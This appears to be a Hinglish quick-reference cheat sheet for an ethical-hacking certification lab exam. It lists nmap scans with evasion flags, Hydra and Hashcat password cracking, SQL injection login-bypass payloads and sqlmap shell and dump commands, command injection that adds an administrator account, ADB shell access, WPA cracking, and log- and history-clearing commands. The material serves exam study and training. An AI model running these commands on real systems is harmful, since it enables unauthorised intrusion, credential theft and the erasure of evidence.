# ⚡ Module 13: Quick Reference — All-in-One Cheat Sheet

> **Exam hall mein ek hi file kholni ho toh YE KHOLO! Sab kuch ek jagah!**

---

## 🏁 FIRST THING — Har Question Mein

```bash
sudo su
nmap -A -T4 <target_ip>
```

---

## ⚡ STEP 1: ALIVE HOSTS DHUNDHO (SABSE PEHLE!)

```bash
netdiscover -i eth0 -r 192.168.1.0/24       # ARP scan — best for LAN
arp-scan -I eth0 192.168.1.0/24              # ARP scan — fast & accurate
nmap -sn 192.168.1.0/24                      # Ping sweep
nmap -PR 192.168.1.0/24                      # ARP ping via nmap
```
> 💡 **Pehle alive hosts dhundho → phir unpe detail scan karo!**

---

## 🔍 SCANNING

```bash
nmap -sn 192.168.1.0/24                    # Alive hosts (ping sweep)
nmap -A -T4 <ip>                            # Aggressive scan
nmap -O <ip>                                # OS detection
nmap -sV <ip>                               # Version detection
nmap -sS <ip>                               # Stealth scan
nmap -sU -p 161 <ip>                        # UDP scan (SNMP)
nmap -p- <ip>                               # All ports
nmap -f <ip>                                # Firewall bypass
nmap -D RND:10 <ip>                         # Decoy scan
nmap -g 80 <ip>                             # Source port trick
netdiscover -i eth0 -r 192.168.1.0/24       # ARP scan
hping3 -S <ip> -p 80 -c 5                   # SYN scan
```

---

## 📡 ENUMERATION

```bash
nbtstat -a <ip>                              # NetBIOS (Windows)
nmap --script nbstat.nse <ip>                # NetBIOS (nmap)
enum4linux -a <ip>                           # SMB/NetBIOS all
nmap -p445 --script smb-os-discovery <ip>    # SMB OS
nmap -sU -p161 --script snmp-brute <ip>      # SNMP
snmp-check <ip>                              # SNMP enum
dnsrecon -d <domain> -z                      # DNS
nmap -p389 -sV <ip>                          # LDAP/FQDN
nmap -p21 --script ftp-anon <ip>             # FTP anon
nmap -p3306 --script mysql-info <ip>         # MySQL
nmap -p3389 <ip>                             # RDP check
```

---

## 🔓 PASSWORD CRACKING

```bash
# HYDRA (Online)
hydra -l <user> -P <passlist> ftp://<ip>
hydra -l <user> -P <passlist> ssh://<ip>
hydra -l <user> -P <passlist> rdp://<ip>
hydra -L <userlist> -P <passlist> smb://<ip>
hydra -l <user> -P <passlist> <ip> mysql
hydra -l <user> -P <passlist> telnet://<ip>

# JOHN (Offline)
john --wordlist=rockyou.txt hash.txt
john --show hash.txt

# HASHCAT
hashcat -m 0 hash.txt wordlist.txt          # MD5
hashcat -m 1000 hash.txt wordlist.txt       # NTLM
```

**Wordlists**: `/home/attacker/Desktop/CEH_TOOLS/Wordlists/` or `/usr/share/wordlists/rockyou.txt`

---

## 🌐 WEB HACKING

```bash
# Directory brute force
gobuster dir -u http://<ip> -w /usr/share/wordlists/dirb/common.txt

# WordPress
wpscan --url http://<ip> --enumerate u
wpscan --url http://<ip> -U admin -P passlist.txt

# Nikto
nikto -h http://<ip>

# OWASP ZAP
zaproxy
```

---

## 💉 SQL INJECTION

```sql
-- Login bypass
' OR 1=1 --
admin' --

-- SQLMap
sqlmap -u "http://url?id=1" --cookie="..." --dbs
sqlmap -u "http://url?id=1" --cookie="..." -D dbname --tables
sqlmap -u "http://url?id=1" --cookie="..." -D dbname -T tbl --dump
sqlmap -u "http://url?id=1" --cookie="..." --os-shell
```

**Cookie**: Browser → F12 → Console → `document.cookie`

---

## 💉 COMMAND INJECTION

```bash
| whoami
| net user
| dir C:\
| net user hacker Pass123 /add
| net localgroup Administrators hacker /add
```

---

## 📶 SNIFFING (WIRESHARK)

```
http.request.method == POST              # Passwords
tcp.flags.syn==1 and tcp.flags.ack==0    # Machine count
tcp.flags.syn==1                         # DoS source
icmp                                     # Check TTL for OS
```

**TTL**: 64=Linux, 128=Windows, 254=Solaris, 255=Cisco

**Passwords**: Edit → Find Packet → String → Packet details → Search "pwd"

---

## 🖼️ STEGANOGRAPHY

```bash
# SNOW (text)
snow -C -m "secret message" -p "password" input.txt output.txt
snow -C -p "password" output.txt

# OpenStego → GUI → Data Hiding → Hide / Extract

# Steghide (image)
steghide embed -cf image.jpg -ef secret.txt -p password
steghide extract -sf stego.jpg -p password
```

---

## 📱 ANDROID

```bash
nmap -sV -p 5555 <ip>           # Scan ADB
adb connect <ip>:5555           # Connect
adb shell                       # Shell
cd sdcard && ls && cat secret.txt
find / -name "*.txt" 2>/dev/null
```

---

## 📡 WIFI

```bash
# WEP
aircrack-ng capture.cap

# WPA2
aircrack-ng -a2 -b <BSSID> -w rockyou.txt capture.cap
```

---

## 🔐 CRYPTOGRAPHY

```bash
# Hashing
md5sum file.txt
sha256sum file.txt
certutil -hashfile file MD5           # Windows

# Base64
echo -n "text" | base64              # Encode
echo -n "dGV4dA==" | base64 -d      # Decode

# HashCalc → GUI → Select file → Calculate
# VeraCrypt → GUI → Create/Mount Volume
```

---

## 🖥️ WINDOWS COMMANDS

```cmd
whoami
net user
net localgroup administrators
systeminfo
ipconfig /all
tasklist
netstat -an
net user hacker Pass /add
net localgroup administrators hacker /add
wevtutil cl System                   # Clear logs
```

---

## 🐧 LINUX COMMANDS

```bash
whoami && id
sudo -l
find / -perm -4000 2>/dev/null       # SUID
cat /etc/passwd
cat /etc/shadow
uname -a
ifconfig
netstat -tulnp
history -c                           # Clear history
```

---

## 📋 COMMON PORTS

| Port | Service | Port | Service |
|------|---------|------|---------|
| 21 | FTP | 161 | SNMP |
| 22 | SSH | 389 | LDAP |
| 23 | Telnet | 443 | HTTPS |
| 25 | SMTP | 445 | SMB |
| 53 | DNS | 1433 | MSSQL |
| 80 | HTTP | 3306 | MySQL |
| 110 | POP3 | 3389 | RDP |
| 135 | MSRPC | 5555 | ADB |
| 137-139 | NetBIOS | 8080 | HTTP-Proxy |

---

## 🔑 HASH TYPES

| Hash | Length | Mode (hashcat) |
|------|--------|----------------|
| MD5 | 32 chars | -m 0 |
| SHA-1 | 40 chars | -m 100 |
| SHA-256 | 64 chars | -m 1400 |
| NTLM | 32 chars | -m 1000 |

---

## 🎯 EXAM STRATEGY
```
⏰ 6 hours = 20 questions = ~18 min each
✅ Easy first: Scanning, Enum, Stego, Wireshark, WiFi
⚠️ Hard later: SQLi, System Hacking, Web App
💡 Always start with: sudo su → nmap -A -T4 <target>
📝 Read question carefully — answer format matters!
```

